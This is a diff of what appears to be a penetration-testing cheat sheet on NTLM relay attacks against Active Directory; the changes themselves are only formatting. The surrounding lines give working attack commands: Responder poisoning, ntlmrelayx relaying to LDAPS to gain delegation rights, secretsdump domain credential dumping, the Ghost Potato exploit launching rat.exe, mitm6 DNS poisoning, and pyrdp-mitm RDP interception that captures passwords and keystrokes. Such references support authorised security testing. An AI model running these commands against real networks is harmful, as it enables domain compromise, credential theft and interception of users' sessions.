@@ -32,11 +32,13 @@ msf exploit(smb_relay) > show targets
 ## LDAP signing not required and LDAP channel binding disabled
 
 During security assessment, sometimes we don't have any account to perform the audit. Therefore we can inject ourselves into the Active Directory by performing NTLM relaying attack. For this technique three requirements are needed:
+
 * LDAP signing not required (by default set to `Not required`)
 * LDAP channel binding is disabled. (by default disabled)
 * `ms-DS-MachineAccountQuota` needs to be at least at 1 for the account relayed (10 by default)
 
 Then we can use a tool to poison `LLMNR`, `MDNS` and `NETBIOS` requests on the network such as `Responder` and use `ntlmrelayx` to add our computer.
+
 ```bash
 # On first terminal
 sudo ./Responder.py -I eth0 -wfrd -P -v
@@ -141,8 +143,8 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
     TERM1> secretsdump.py testsegment/ntu@s2016dc.testsegment.local -just-dc
     ```
 
-
 - Using any AD account, connect over SMB to the victim server, and trigger the SpoolService bug. The attacker server will connect back to you over SMB, which can be relayed with a modified version of ntlmrelayx to LDAP. Using the relayed LDAP authentication, grant Resource Based Constrained Delegation privileges for the victim server to a computer account under the control of the attacker. The attacker can now authenticate as any user on the victim server.
+
     ```powershell
     # create a new machine account
     TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
@@ -158,6 +160,7 @@ python2 scanMIC.py 'DOMAIN/USERNAME:PASSWORD@TARGET'
 ## Ghost Potato - CVE-2019-1384
 
 Requirements:
+
 * User must be a member of the local Administrators group
 * User must be a member of the Backup Operators group
 * Token must be elevated
@@ -174,6 +177,7 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 > It abuses the DCOM activation service and trigger an NTLM authentication of the user currently logged on in the target machine
 
 Requirements:
+
 - a shell in session 0 (e.g. WinRm shell or SSH shell)
 - a privileged user is logged on in the session 1 (e.g. a Domain Admin user)
 
@@ -189,6 +193,7 @@ Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ## DNS Poisonning - Relay delegation with mitm6
 
 Requirements: 
+
 - IPv6 enabled (Windows prefers IPV6 over IPv4)
 - LDAP over TLS (LDAPS)
 
@@ -223,9 +228,11 @@ secretsdump.py -k -no-pass target.lab.local
 > Example of exploitation where you can coerce machine accounts to authenticate to a host and combine it with Resource Based Constrained Delegation to gain elevated access. It allows attackers to elicit authentications made over HTTP instead of SMB
 
 **Requirement**:
+
 *  WebClient service
 
 **Exploitation**:
+
 * Disable HTTP in Responder: `sudo vi /usr/share/responder/Responder.conf`
 * Generate a Windows machine name: `sudo responder -I eth0`, e.g: WIN-UBNW4FI3AP0
 * Prepare for RBCD against the DC: `python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support`
@@ -267,12 +274,16 @@ pyrdp-mitm.py <IP>
 pyrdp-mitp.py <IP>:<PORT> # with custom port
 pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
 ```
-* Exploitation
-  * If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
-  * If NLA is disabled, you will obtain the password in plaintext
-  * Other features are available such as keystroke recording
-* Alternatives
-  * S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
+
+**Exploitation**
+
+* If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
+* If NLA is disabled, you will obtain the password in plaintext
+* Other features are available such as keystroke recording
+
+**Alternatives**
+
+* S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
 
 
 ## References
